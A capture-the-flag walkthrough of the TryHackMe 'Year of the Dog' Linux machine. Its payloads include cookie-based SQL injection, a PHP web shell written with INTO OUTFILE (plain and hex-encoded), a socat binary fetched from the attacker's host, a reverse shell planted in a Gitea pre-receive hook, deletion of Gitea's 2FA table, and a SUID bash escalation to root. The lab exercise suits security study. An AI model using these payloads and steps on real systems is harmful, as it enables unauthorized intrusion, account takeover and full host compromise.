---
categories: [TryHackMe]
tags: [ SQLi, gitea, RFI, SUIDs, PrivEsc, socat, Port Forwording]
media_subpath: /assets/images/
image:
  alt: Linux Hard Level Machine 👹
  width: "1200"
  height: "630"
  path: yearofthedog.png

---

| Machine Link       | [https://tryhackme.com/r/room/yearofthedog](https://tryhackme.com/r/room/yearofthedog) |
| ------------------ | -------------------------------------------------------------------------------------- |
| Operating System   | Linux                                                                                  |
| Difficulty         | Hard                                                                                   |
| Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)                               |

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotd]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.237.188
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 22:21 IST
Nmap scan report for 10.10.237.188
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Web Enumeration ⤵️

On port 80 I got a simple page →

![Untitled](Untitled.png)

with directory traversdal I also got a page called `config.php` file but cant access the php file so lets see this page behavior with burpsuite →

![Untitled](Untitled%201.png)

Tempering with cookies id I got a sql injection indication like this →

![Untitled](Untitled%202.png)

with <mark style="background: #ADCCFFA6;">sqli</mark> lets see how many column its database has →

```sql
1' UNION SELECT 1,2--+
#OR
1' ORDER BY 1,2--+
#OR
1' ORDER BY 2--+
```
{: .nolineno}

![Untitled](Untitled%203.png)

Trying anything else give me this error →

![Untitled](Untitled%204.png)

That is why I got confirmed that this database have 2 columns so lets try <mark style="background: #CACFD9A6;">RCE</mark> on this column with this command →

```sql
' UNION SELECT 1,LOAD_FILE("/etc/passwd") -- -
```
{: .nolineno}

![Untitled](Untitled%205.png)

I tried to read the `config.php` file that I got from directory or files bruteforcing so lets see →

![Untitled](Untitled%206.png)

This time lets try to do RFI (Remote File Inclusion) like this →

```sql
' UNION SELECT 1,<?php system($_GET['cmd']); ?> INTO OUTFILE '/var/www/html/shell.php' -- -
# '' OR WE CAN HEX ENCODE THE PAYLOAD FOR EXECUTION ALTERNATIVE WAY LIKE THIS ⤵️ 

'UNION SELECT 1,0x3C3F7068702073797374656D28245F524551554553545B27636D64275D293B203F3E INTO OUTFILE '/var/www/html/shell2.php'-- -
```
{: .nolineno}

with first method I got this error →

![Untitled](Untitled%207.png)

So lets try to upload the payload with hex encoded like above code .

![Untitled](Untitled%208.png)

Now lets try RFI execution on this page →

![Untitled](Untitled%209.png)
_RFI execution_

Its time to get the shell with this RFI →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotd]
└─$ nc -lvnp 4444                 
listening on [any] 4444 ...
connect to [10.8.83.156] from (UNKNOWN) [10.10.84.101] 56514
/bin/sh: 0: cant access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@year-of-the-dog:/var/www/html$ whoami
whoami
www-data
www-data@year-of-the-dog:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@year-of-the-dog:/var/www/html$
```
{: .nolineno}

## SSH SHELL ⤵️

I checked the connections and got this →

```bash
www-data@year-of-the-dog:/$ ss -tunlp | grep 127.0.0.1
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:3000           0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:34247          0.0.0.0:*     
www-data@year-of-the-dog:/$
```
{: .nolineno}

I also found some data related to <span style="color:#fd77f8">dylan</span> user in this file `work_analysis` :

```bash
www-data@year-of-the-dog:/home/dylan$ grep -r 'dylan' work_analysis 
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]
www-data@year-of-the-dog:/home/dylan$
www-data@year-of-the-dog:/home/dylan$ cat .gitconfig 
[user]
	name = Dylan
	email = dylan@yearofthedog.thm
www-data@year-of-the-dog:/home/dylan$
```
{: .nolineno}

I think due to bruteforce of username:password for SSH the credetials leaked like this →

```bash
dylan:<PASSWORD>
```
{: .nolineno}

Now I port forworded the port 3000 for external access with socat Tool →

```bash
www-data@year-of-the-dog:/tmp$ wget http://10.8.83.156/socat_x86
--2023-09-28 10:04:05--  http://10.8.83.156/socat_x86
Connecting to 10.8.83.156:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat_x86'

socat_x86           100%[===================>] 366.38K   345KB/s    in 1.1s    

2023-09-28 10:04:06 (345 KB/s) - 'socat_x86' saved [375176/375176]

www-data@year-of-the-dog:/tmp$ chmod +x *
www-data@year-of-the-dog:/tmp$ ./socat_x86 TCP-LISTEN:2222,reuseaddr,fork TCP:127.0.0.1:3000 &
[1] 1538
www-data@year-of-the-dog:/tmp$
```
{: .nolineno}

Now lets check if the port 2222 got open on victim machine →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotd]
└─$ sudo nmap -p 2222 10.10.39.160               
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 14:34 IST
Nmap scan report for 10.10.39.160
Host is up (0.17s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```
{: .nolineno}

Now lets access this site on web browser →

![Untitled](Untitled%2010.png)
_gitea Dashboad_

This port host the <mark style="background: #D2B3FFA6;">gitea</mark> in it , Lets try to login with the credentials or data that we have got from the Local Privilege Escalation →

![Untitled](Untitled%2011.png)

I need to enter this <span style="color:#00ff91">2FA passcode</span> and I don’t have this access so lets try some thing else Like try to add a user having admin privileges and then transfer that file to that only `gitea.db` location :

I registered a new user as `strongshiv8` →

![Untitled](Untitled%2012.png)

I can also port forward this with SSH command only like this 🔽

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Year_of_the_dog]
└─$ ssh -L 3000:127.0.0.1:3000 dylan@10.10.142.78
dylan@10.10.142.78s password: 


	__   __                       __   _   _            ____    
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ 
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | 
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ 

dylan@year-of-the-dog:~$ whoami
dylan
dylan@year-of-the-dog:~$ id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
dylan@year-of-the-dog:~$ 
```
{: .nolineno}

Now as sqlite in not installed on this system so I transferred its database to attackers machine.

To disable 2 factor Authentication from <span style="color:#fd77f8">dylan</span> account there is 2 way :

1. You download the `gitea.db` file on attacker machine then delete the two_factor table from the database then re-upload the gitea file that will be good to go .
2. Another way is to use this python script or say command to do so 🔽

```python
import sqlite3
conn=sqlite3.connect('gitea.db')
conn.execute('delete from two_factor')
conn.commit()
conn.close()
```
{: .nolineno}

![Untitled](Untitled%2013.png)

Lets re-login and see weather I am successfully accomplish my needs or not : 

![Untitled](Untitled%2014.png)

I can login successfully now without 2 factor Auth so lets enumerate further 🔽

![Untitled](Untitled%2015.png)

I opened this git Hook option and added the reverse shell command in ***pre-receive*** you can choose any option that will work just fine.

![Untitled](Untitled%2016.png)

Now I have to alter the data of this repository by clonning it then adding some changes in **README.md** file after that pushing back to its repo that will trigger my reverse shell like this .

```bash
git clone http://127.0.0.1:3000/Dylan/Test-Repo
cd Test-Repo/
echo "Reverse Shell Time \!" >> README.md
git add README.md
git commit -m "Modified README.md file"
git push
Username for 'http://127.0.0.1:3000': dylan
Password for 'http://dylan@127.0.0.1:3000': <PASSWORD>
Everything up-to-date
```
{: .nolineno}

After executing the last part I would get the reverse shell triggered like this ⏬

![Untitled](Untitled%2017.png)

Reverse shell : 

![Untitled](Untitled%2018.png)

I checked its root prvileges and I got full access ⏬

```bash
/data/git $ sudo -l
User git may run the following commands on 42040a8f97fc:
    (ALL) NOPASSWD: ALL
/data/git $
```
{: .nolineno}

So I am root now : 

```bash
/data/git $ sudo -s
whoami
root
/bin/bash -i
bash: cannot set terminal process group (16): Not a tty
bash: no job control in this shell
bash-5.0#
```
{: .nolineno}

Now for root in victim machine I need to transfer the victim machine bash file into the git shell or directory so that it can get the SUIDs permission from git root shell and that will work as effective SUID root for victim machine like this 🔻 

```bash
dylan@year-of-the-dog:/gitea/gitea$ cp /bin/bash .
dylan@year-of-the-dog:/gitea/gitea$ ls -al
total 2312
drwxr-xr-x 9 dylan dylan    4096 Mar 23 06:34 .
drwxr-xr-x 5 root  root     4096 Sep  5  2020 ..
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 attachments
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 avatars
-rwxr-xr-x 1 dylan dylan 1113504 Mar 23 06:34 bash
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 conf
-rw-r--r-- 1 dylan dylan 1212416 Mar 23 05:57 gitea.db
drwxr-xr-x 4 dylan dylan    4096 Sep  5  2020 indexers
drwxr-xr-x 2 dylan dylan    4096 Sep  6  2020 log
drwxr-xr-x 6 dylan dylan    4096 Sep  5  2020 queues
drwx------ 7 dylan dylan    4096 Mar 23 05:31 sessions
dylan@year-of-the-dog:/gitea/gitea$
```
{: .nolineno}

Now I have to own this file as root and give it SUIDs permissions like this ⏬

```bash
bash-5.0# ls -al
ls -al
total 2312
drwxr-xr-x    9 git      git           4096 Mar 23 06:34 .
drwxr-xr-x    5 root     root          4096 Sep  5  2020 ..
drwxr-xr-x    2 git      git           4096 Sep  5  2020 attachments
drwxr-xr-x    2 git      git           4096 Sep  5  2020 avatars
-rwxr-xr-x    1 git      git        1113504 Mar 23 06:34 bash
drwxr-xr-x    2 git      git           4096 Sep  5  2020 conf
-rw-r--r--    1 git      git        1212416 Mar 23 05:57 gitea.db
drwxr-xr-x    4 git      git           4096 Sep  5  2020 indexers
drwxr-xr-x    2 git      git           4096 Sep  6  2020 log
drwxr-xr-x    6 git      git           4096 Sep  5  2020 queues
drwx------    7 git      git           4096 Mar 23 05:31 sessions
bash-5.0# chown root:root bash
chown root:root bash
bash-5.0# ls -al
ls -al
total 2312
drwxr-xr-x    9 git      git           4096 Mar 23 06:34 .
drwxr-xr-x    5 root     root          4096 Sep  5  2020 ..
drwxr-xr-x    2 git      git           4096 Sep  5  2020 attachments
drwxr-xr-x    2 git      git           4096 Sep  5  2020 avatars
-rwxr-xr-x    1 root     root       1113504 Mar 23 06:34 bash
drwxr-xr-x    2 git      git           4096 Sep  5  2020 conf
-rw-r--r--    1 git      git        1212416 Mar 23 05:57 gitea.db
drwxr-xr-x    4 git      git           4096 Sep  5  2020 indexers
drwxr-xr-x    2 git      git           4096 Sep  6  2020 log
drwxr-xr-x    6 git      git           4096 Sep  5  2020 queues
drwx------    7 git      git           4096 Mar 23 05:31 sessions
bash-5.0# chmod u+s bash
chmod u+s bash
bash-5.0# ls -al
ls -al
total 2312
drwxr-xr-x    9 git      git           4096 Mar 23 06:34 .
drwxr-xr-x    5 root     root          4096 Sep  5  2020 ..
drwxr-xr-x    2 git      git           4096 Sep  5  2020 attachments
drwxr-xr-x    2 git      git           4096 Sep  5  2020 avatars
-rwsr-xr-x    1 root     root       1113504 Mar 23 06:34 bash
drwxr-xr-x    2 git      git           4096 Sep  5  2020 conf
-rw-r--r--    1 git      git        1212416 Mar 23 05:57 gitea.db
drwxr-xr-x    4 git      git           4096 Sep  5  2020 indexers
drwxr-xr-x    2 git      git           4096 Sep  6  2020 log
drwxr-xr-x    6 git      git           4096 Sep  5  2020 queues
drwx------    7 git      git           4096 Mar 23 05:31 sessions
bash-5.0# 
```
{: .nolineno}

Lets use this bash to get effective SUID root permission .

![Untitled](Untitled%2019.png)

```bash
bash-4.4# cd /root
bash-4.4# ls -al
total 28
drwx------  4 root root 4096 Sep  6  2020 .
drwxr-xr-x 23 root root 4096 May 31  2021 ..
lrwxrwxrwx  1 root root    9 Sep  3  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Sep  3  2020 .cache
drwx------  3 root root 4096 Sep  3  2020 .gnupg
lrwxrwxrwx  1 root root    9 Sep  6  2020 .mysql_history -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 Sep  5  2020 root.txt
bash-4.4# cat root.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}
bash-4.4# 
```
{: .nolineno}

I am root Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }